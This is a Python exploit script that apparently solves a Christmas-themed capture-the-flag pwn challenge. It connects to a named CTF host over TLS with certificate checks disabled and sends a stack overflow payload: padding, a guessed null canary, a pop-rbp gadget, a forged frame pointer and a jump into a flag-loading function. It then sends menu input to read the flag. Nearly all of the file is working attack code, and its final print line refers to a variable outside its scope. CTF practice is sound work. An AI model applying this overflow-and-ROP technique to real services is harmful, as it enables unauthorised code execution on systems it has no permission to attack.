import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
ALT_HOST = "129.241.150.145"
PORT = 1337

# Canary from brute force (Nulls)
CANARY = b"\x00" * 8
RET1 = 0x401B72  # load_flag_to_location
BUF_TO_CANARY = 40

# Fake RBP strategy
# We need rbp-0x14 to be 4. 
# We found 4 at 0x404140 (checked via xxd).
# So Target RBP = 0x404140 + 0x14 = 0x404154.
# We jump to 0x401b81 (inside load_flag, skipping `mov edi, [rbp-0x14]` save, but BEFORE `mov eax, [rbp-0x14]` load).
# We use pop rbp gadget at 0x40141d.

POP_RBP = 0x40141d
TARGET_RBP = 0x404154
SKIP_PROLOGUE_RET = 0x401b81

payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8                  # Overwrite Saved RBP (Consumed by ret inside greet_user, but we have a gadget!)
                                # Actually: greet_user ret pops RIP. 
                                # So stack should be: [Canary] [Old RBP] [POP RBP Addr] [New RBP Value] [Target Addr]
    + (POP_RBP).to_bytes(8, "little")
    + (TARGET_RBP).to_bytes(8, "little")
    + (SKIP_PROLOGUE_RET).to_bytes(8, "little")
)


def attempt_exploit():
    raw = None
    last_err = None
    for h in [HOST, ALT_HOST]:
        try:
            raw = socket.create_connection((h, PORT), timeout=3)
            host_used = h
            break
        except OSError as e:
            last_err = e
    if raw is None:
        print(f"Connection failed: {last_err}")
        return

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ss = ctx.wrap_socket(raw, server_hostname=host_used)

    try:
        ss.sendall(str(len(payload)).encode() + b"\n")
        time.sleep(0.5)
        ss.sendall(payload)
        time.sleep(0.5)

        print("Payload sent. Reading response...")
        buf = b""
        ss.settimeout(2.0)
        start_t = time.time()
        while time.time() - start_t < 3:
            try:
                chunk = ss.recv(4096)
                if not chunk: break
                buf += chunk
                if b"Santa is missing" in buf:
                    break
            except TimeoutError:
                break
            except Exception:
                break
        
        print(f"Response: {buf[:50]}...")
        
        print("Sending navigation...")
        ss.sendall(b"3\n")
        time.sleep(0.2)
        ss.sendall(b"1\n")

        print("Reading flag...")
        ss.settimeout(2.0)
        while True:
            chunk = ss.recv(4096)
            if not chunk: break
            print(chunk.decode(errors='replace'), end='')
    except Exception as e:
        print(f"Error during attempt: {e}")
    finally:
        ss.close()

for i in range(5):
    print(f"\n--- Attempt {i+1} ---")
    attempt_exploit()
    time.sleep(1)


print(buf.decode(errors="replace"))
